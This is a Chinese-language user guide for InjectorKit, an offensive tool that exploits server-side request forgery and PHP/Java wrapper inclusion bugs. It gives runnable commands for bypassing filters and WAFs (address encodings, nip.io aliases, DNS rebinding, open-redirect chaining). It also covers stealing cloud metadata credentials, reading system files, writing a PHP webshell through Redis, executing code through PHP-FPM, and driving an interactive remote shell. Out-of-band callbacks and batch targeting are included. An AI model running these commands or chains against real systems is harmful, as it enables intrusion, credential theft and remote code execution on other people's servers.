# InjectorKit 使用指南

工具目前能做的全部事情，按你会用到的顺序排。这里每条命令都能直接跑。

- [这是什么](#这是什么)
- [运行](#运行)
- [给它一个目标](#给它一个目标)
- [选参数](#选参数)
- [回调](#回调)
- [绕过过滤器](#绕过过滤器)
- [它一步步做什么](#它一步步做什么)
- [利用](#利用)
- [伪协议这一类](#伪协议这一类)
- [两次运行之间的记忆](#两次运行之间的记忆)
- [读懂输出](#读懂输出)
- [退出码与脚本化](#退出码与脚本化)
- [常用配方](#常用配方)
- [排错](#排错)

## 这是什么

一次测一类漏洞、一次打一个目标的工具，由它自己决定下一步试什么。你给它一个怀疑有问题的请求，它弄清楚这个参数能到达哪里、中间是不是有过滤器、什么能过去；如果你让它动手，它还会把发现的东西变成落地的文件或者一条能跑起来的命令。

它不是扫描器，不会爬站找候选点。它拿你已经有的那个请求，往深里打。

## 运行

    python injectorkit.py ssrf -h
    python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"

Python 3.11 或更新。核心部分不需要装任何东西。只有通过 interactsh 收回调时才需要 `cryptography`。

每种漏洞是一个子命令，有各自专属的选项，再加上所有子命令共享的引擎选项。

## 给它一个目标

四种给法，按你手上的东西挑。

### 一个 URL

    python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"

你怀疑的参数就在 URL 里。参数由工具自己找。

### 一个抓下来的请求

    python injectorkit.py ssrf -r request.txt

`request.txt` 就是代理保存下来的样子：请求行、头、body。请求行是 origin-form（`POST /api/fetch HTTP/1.1` 加 `Host` 头）可以直接用，绝对形式也可以。body 逐字节保留，所以 multipart 或二进制的 body 原样送出去。

### 一次打一批

    python injectorkit.py ssrf --batch targets.txt

一行一个目标：一个 URL，或者一个保存下来的报文文件路径。空行和 `#` 注释会跳过。每个目标依次跑，共用同一套引擎选项。

### 页面声明的表单

    python injectorkit.py ssrf -u "http://target/login" --forms

工具抓一次页面，读出它声明的每个表单，然后按浏览器的方式构造请求——GET 字段进查询串、POST 字段进 body、上传表单发真正的 multipart。这是够到"根本不在 URL 里"的参数的办法：登录框、搜索框、文件选择器。每个表单都成为独立目标。

## 选参数

默认情况下，工具挑最常承载 URL 的那些参数名：`url`、`uri`、`dest`、`target`、`redirect`、`file`、`path`、`host` 等。往一个根本没人读的参数发一百个请求就是浪费一百个请求，所以它也会记住哪些被拒了。

自己指定：

    --param url                 query:url，或任意位置叫这个名字的
    --param query:url           精确指定查询串里的
    --param body:callback       body 里的表单字段或 JSON 字段
    --param cookie:next         cookie
    --param multipart:avatar    multipart body 里的某个 part
    --param "json -> ref"       参数值本身是 JSON、字段在其中的那个
    --param json:user.avatar    JSON body 的字段，按路径寻址

嵌套 JSON 按路径寻址，数组也算：`json:meta.list[0].href`。

    --max-params 6             最多试几个候选（默认 6）

输出里参数长这样：`query:url`、`json -> ref`、`multipart:file`，两个参数拼成一个目的地时是 `query:host + query:path`。

## 回调

盲漏洞在响应里什么都不留，唯一的证据是目标向你控制的地址发起的那次连接，所以工具需要一个。

### 本机监听

    python injectorkit.py ssrf -u "http://target/fetch?url=x" --oob 10.0.0.5:8081

目标能连到你这台机器时用这个——同网段的 CTF 箱子、内网靶场，任何能路由回来的环境。

    --oob-public 1.2.3.4:8081

如果这台机器有多个地址，或者躲在 NAT 后面，工具得知道该告诉目标哪个地址，这个参数就是干这个的。

### 走 interactsh

    python injectorkit.py ssrf -u "http://target/fetch?url=x" --oob-interactsh oast.pro

回调域名在任何地方都能解析，打公网目标就需要这个。公共部署有 `oast.pro`、`oast.live`、`oast.site`、`oast.online`、`oast.fun`、`oast.me`。私有部署把名字和 token 都给它：

    --oob-interactsh oast.example.com --oob-token <token>

协议细节工具自己处理：注册、回调名、轮询记录。

### 等多久

    --oob-wait 5.0

每次尝试之后等回调的秒数。目标慢就调大，网络快又赶时间就调小。

两个参数都不给时，盲打的动作会自己跳过。一个永远不可能到达的回调不算测试，种下去只是白费一个请求。

## 绕过过滤器

一部分是自动的，剩下的需要你给一样东西。

### 自动的部分

工具已经会按学出来的顺序尝试：

- **地址写法**：十进制（`2130706433`）、八进制（`0177.0.0.1`）、十六进制（`0x7f000001`）、短形式（`127.1`）、IPv4-mapped IPv6（`[::ffff:127.0.0.1]`）、结尾加点（`127.0.0.1.`）
- **DNS 别名**：`127.0.0.1.nip.io`、`127-0-0-1.nip.io`、`127.0.0.1.sslip.io`——解析型过滤器看到的是域名，解析器看到的是里面的地址
- **编码**：单层和双层百分号编码、只编特殊字符、CRLF 编成 `%0d%0a` 或裸 `%0a`、结尾空字节
- **大小写**：交替大小写、scheme 全大写
- **authority 混淆**：`http://x@host/`、`http://real.example@host/`、authority 里塞制表符

- **同一个参数再送一次**：原值在前、payload 在后。只读每个参数第一个值的过滤器判的是前者，取最后一个值的运行时执行的是后者。这个手法不需要改写任何东西，所以它在所有变异之前先试一次——而且单独记账，这样先验能学到哪些目标读全部值、哪些只读第一个

### 白名单需要一条路

黑名单可以讲道理，白名单不行。目的地必须以过滤器接受的形态出现、再落到别处。这就是它的用途：

    --via "http://allowed-host/redirect?to={target}"

`{target}` 代表真正的目的地。要几条路就重复几次这个参数。当目标只接受它信任的某个主机上的 URL、而那个主机上有任意跳转时，就用它。

### 两个参数，一个目的地

应用用 `?host=` 和 `?path=` 拼目的地时，只填一个够不到。工具会把两个都填上。

### 一个会换答案的域名

    --rebind 169.254.169.254,192.168.44.1

每个目的地会再以一个在这两个地址之间来回变的域名（`rbndr.us`）试一次。这能过那种"先解析一次、觉得地址没问题、之后才去连"的检查。

### 关掉升级

    --no-bypass

只按原样发种子，别的都不发。调"payload 为什么没到"的时候有用，打生产环境想留最小足迹的时候也有用。

## 它一步步做什么

工具在已有认知之上跑一个状态机。动作按顺序是：

    probe.metadata          要云元数据（AWS、Azure、GCP、阿里云）
    probe.metadata.headers  带上服务要求的请求头再要一次
    probe.file              让抓取去读本地文件（file://、php://filter、data:// 等）
    probe.callback          种一个回调然后等它回来
    probe.redirect          回一个 302，看目标会不会把这条路走完
    probe.diagnostics       找那些把我们的输入复述出来的取回错误
    probe.split             填满拼成一个目的地的两个参数
    probe.channel           判断结果是以什么方式回来的
    scheme_matrix           按这个方式去试对应的 scheme
    fingerprint.services    给内网服务打指纹（redis、docker、etcd、kubelet、elastic、consul、memcached、PHP-FPM）
    exploit.services        你要求动手时，对指纹到的东西动手
    report.summary          输出结果

下一个动作跑哪个是判断出来的，不是写死的：有服务应答就往利用走，被过滤器拒了就换变异代际，确认能读就关掉探测分支。`-v` 看流量和判断过程，`-vv` 连带 traceback。

## 利用

默认关着。在别人的服务器上写文件、执行命令，是你的决定，不是扫描器替你做。

    --exploit --webroot /var/www/html

Redis 链，用在应答了的 Redis 上。它设 `dir` 和 `dbfilename`、关掉 RDB 压缩（不关的话 payload 被压缩存储，PHP 一个字都不解析）、写一个 PHP shell，然后**请求这个 shell 并执行 `id` 来证明它真的能跑**。写进去了但跑不起来，会如实这么报。

    --exploit --fpm-script /var/www/html/index.php

PHP-FPM 链，用在应答了的 FastCGI 监听上。它发一对真正的 FastCGI 记录，带 `PHP_VALUE auto_prepend_file = php://input`，于是请求体里的代码会在指定脚本之前执行，输出随 FastCGI 回包返回。

    --shell-name shell.php     写进去的 shell 叫什么
    --fpm-port 9000            PHP-FPM 不在默认端口时用

两条链都先要指纹，所以只有在那个服务确实可达的目标上才会触发。

## 伪协议这一类

    python injectorkit.py proto -u "http://target/?file=index.php"
    python injectorkit.py proto -r burp.txt --param file --oob 10.0.0.5:8081

一个收文件名的参数是个分发点：它接受哪种包装器，就说明背后是哪个运行时、那个运行时会交出什么。

会试的东西，按用途分组：

    php://filter              读源码，包含双层编码、混合过滤器等多种写法
    php://input、php://fd、    读请求本身的那些包装器
    php://memory、php://temp
    data://、expect://        代码执行，取决于运行时是否允许
    file://、裸路径            普通读取，用来确认确实有东西被传过去
    zip://、phar://、rar://    目标上已有的归档（需要 --upload）
    compress.zlib、compress.bzip2、glob://、ssh2://、ogg://、ftp://
                              PHP 那族的其余部分
    jar:、jrt:、netdoc://      Java 这边：交给 JVM 打开的 URL
    ldap:、rmi:、dns:、iiop:   JNDI 查找，靠回连判定
    gopher:、dict:、tftp:      原始协议写入，靠回连判定

要紧的几个选项：

    --read FILE        值得读的文件（可重复）。默认先用应用自己的源码，
                       再用 /etc/passwd —— PHP 的过滤器要前者，
                       Java 的文件读取根本看不见它
    --upload PATH      目标上已有的文件，会启用 zip:// 和 phar://。
                       phar 是从文件读取走到反序列化的常用路径
    --oob HOST:PORT    远程那一族需要它；没有监听时它们自己跳过，
                       而不是种一个注定收不到回执的 payload

证据是只有目标自身行为才会产生的字符串：文件内容、展开后的过滤器链、这一趟自己编的标记、class 文件的魔数，或者回连到监听的那次连接。

### 为什么要跑两趟

每个包装器都会先按原样发一遍，之后才谈改写。原因是预算：一个"只拦某一种写法"的规则集，否则会把整趟跑都耗在改写上，下一个族根本轮不到。对第三方 WAF 就是这样——PHP 那几族花了九十个请求爬代际，Java 那族一次都没试到，于是整趟报"什么都没有"，而 WAF 根本没有规则管的那个包装器就躺在那里没被测。

第一趟每个包装器只花一个请求，能把所有族都跑到。第二趟再回头，只对没应答的那些爬变异代际，那才是"只知道常见写法"的过滤器被打穿的地方。

### 实时 shell

    python injectorkit.py proto -u "http://target/?file=index.php" --os-shell
    os-shell> id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    os-shell> cat /etc/hostname
    target
    os-shell> exit

    python injectorkit.py proto -u "..." --os-cmd "id; uname -a"

链只生成一次、之后复用：它装一个很短的读取器，命令从第二个参数进来。所以每条命令都是一个普通大小的请求，而不是又一条几 KB 的 URL。这一点要紧是因为 payload 预算——**每 1 字节 payload 约等于 250 个链字符**，而 Web 服务器对请求行有长度上限：把命令塞进链里的做法，payload 到三十来字节就没地方了。

代价是命令在那个第二参数里是明文，对检查参数值的过滤器来说正好在它看得见的这一侧。这是这个设计做的取舍。

输入是逐行读的，所以管道和终端一样能用：

    printf 'id\nexit\n' | python injectorkit.py proto -u "..." --os-shell

### 它不做什么

它不会去构造 `phar://` 需要的归档，也不上传文件；`--upload` 指的是目标上已经有的东西。JNDI 那几个协议会发出去、也按回连判定，但只懂 HTTP 的监听器记下的是"连过来了"，不是协议交互本身——足以证明目标向外拨了，不足以给它端上一个 gadget。

## 两次运行之间的记忆

### 哪种改写有效

每次运行都会读写 `.injectorkit/pheromone.json`：哪种地址写法、哪种编码在什么样的过滤器前过去了。第一个目标付的是发现成本，后面几个从它开始。它只改变尝试的顺序，从不决定某个尝试不试。

    --pheromone-file FILE      放到别的位置
    --no-pheromone             不用它，也不改它

如果某个目标的表现和文件里记的不一样，那些条目会随时间衰减回中性——文件会自己纠正，而不是越放越旧。

### 一个目标的进度

    --session s.json

把学到的东西存下来，下次接着用。恢复后的运行会跳过已经关掉的路，而不是重新推一遍：

    第一次      requests sent: 14
    第二次      session: 22 facts and 2 closed paths carried over
                requests sent: 3

会话属于它记录时的那个目标。指向别的主机时会被忽略而不是套用，因为把一个主机的拒绝喂给另一个，正是"恢复后的扫描悄悄跳过了本该测的东西"的成因。

## 读懂输出

三种前缀：

    [!]  证明了某件事
    [+]  执行了某件事
    [>]  工具接下来会做什么（当它停在这一步没往下走时）

一条发现会带上参数、生效的 payload、产生它的代际、请求本身和证据：

    [!] aws-iam via query:url: signature present: secretaccesskey
    [!] ssrf-blind via query:url: http from 10.0.0.5: GET /81ac8963 (token 81ac8963)
    [!] internal service fingerprinted: docker-version (Exposed Docker API)

然后是黑板书——这一趟确认下来的全部，以及有多确定：

    target: target.example
      ssrf.channel = 'out-of-band' [likely] classified from what the probes proved
      ssrf.fetch.confirmed = True [confirmed] callback 81ac8963 reached the listener
      closed paths:
        probe.metadata: request was refused
      not covered:
        probe.remote: no listener was given, so the remote wrappers were skipped
      requests sent: 14

确定性只有三档：

    confirmed     证据只有一种解释
    likely        和证据相符，但不是唯一读法
    inconclusive  记下来了，但没有据此行动

最后两段清单意思不一样，这个区别是要紧的：

    closed paths   跑过并被排除的动作。这是结果。
    not covered    根本没跑的动作，以及它需要什么。这是待办，也是信一次"干净结果"之前该补的东西。

一趟跑下来对某个能力只字不提，读起来就像"那里什么都没有"。`not covered` 是用来明说"没测过"的——盲打没有监听、后续动作没给 `--exploit`、归档访问没有上传路径。这里出现你没料到的行，说明的是这一趟有洞，不是目标有什么结论。

输出在"有人看"的时候是彩色的，没人看的时候是纯文本：管道、重定向、日志文件拿到的内容里没有任何需要剥掉的转义序列。默认会问一下输出流，并尊重 NO_COLOR——终端和日志采集器用不了颜色时会设这个变量。`--color always` 强制彩色，`--color never` 关掉。

## 退出码与脚本化

    0    跑完了（不管有没有发现）
    1    用法问题：没有可注入的参数、参数写错
    2    没给子命令
    130  被中断

注意 0 不代表"有发现"。要用在脚本里，就读输出里的 `[!]` 或者解析黑板：

    python injectorkit.py ssrf -u "$URL" -q | grep -q '^\[!\]' && echo vulnerable

## 常用配方

**内网靶机上的一个 URL 参数**

    python injectorkit.py ssrf -u "http://10.0.0.9/fetch?url=http://example.com"

**同上，带回连**

    python injectorkit.py ssrf -u "http://10.0.0.9/fetch?url=x" --oob 10.0.0.5:8081

**公网目标，在 NAT 后面**

    python injectorkit.py ssrf -u "https://target/fetch?url=x" --oob-interactsh oast.pro

**从 Burp 里拿的请求**

    python injectorkit.py ssrf -r burp.txt --param body:url

**白名单过滤器，可信主机上有跳转**

    python injectorkit.py ssrf -u "http://target/fetch?url=x" \
        --via "http://trusted/out?u={target}" --oob 10.0.0.5:8081

**有服务可达时一路打到执行**

    python injectorkit.py ssrf -u "http://target/fetch?url=x" \
        --exploit --webroot /var/www/html --fpm-script /var/www/html/index.php

**一批主机，安静点**

    python injectorkit.py ssrf --batch hosts.txt -q --oob-interactsh oast.pro

**明天接着打**

    python injectorkit.py ssrf -u "http://target/fetch?url=x" --session target.json

## 排错

**什么都没发现。** 先确认你给的请求真的能到达那个抓取逻辑。`-v` 会把每个请求和它的状态打出来。如果全是 403 或者每次都是同一个页面，说明这个参数不是被读的那个——用 `--param` 换一个，或者参数在表单里就用 `--forms`。

**盲打没结果。** 不给 `--oob` 或 `--oob-interactsh` 时，盲打动作根本不会跑。给了监听的话，确认目标真的能连到那个地址：另一个网段的目标连不回你的私有地址，这正是 interactsh 存在的理由。

**全被拒。** 看输出里的 `closed paths`，它写了排除了什么。如果拒绝来自白名单，答案是 `--via`。如果来自会解析目的地的语义规则集，答案是别名（`nip.io`）或者 `--rebind`。

**链没触发。** `--exploit` 得先有指纹，而且每条链还要一样东西：Redis 要 `--webroot`（Web 服务器真正对外服务的目录），PHP-FPM 要 `--fpm-script`（目标上确实存在的 PHP 文件）。没给的话，服务会被报出来但不动它。

**太慢或者太吵。** `--max-requests` 封顶、`--delay` 放慢、`-q` 只打结果。`--no-bypass` 就按原样发种子，别的都不发。

## 靶场

本仓库的 `lab/` 会在 Debian 或 Kali 上搭出这些示例所针对的目标：一个抓取端点、一个 include、一个开放跳转、一个双参数端点、真 Redis、真 PHP-FPM、云元数据和内网服务的替身，以及四档由松到紧的过滤器。每一档是干什么的、工具打它是什么结果，见 `lab/README.md`。

---

代码答不了的，找作者：coolmoon、guaidao2。
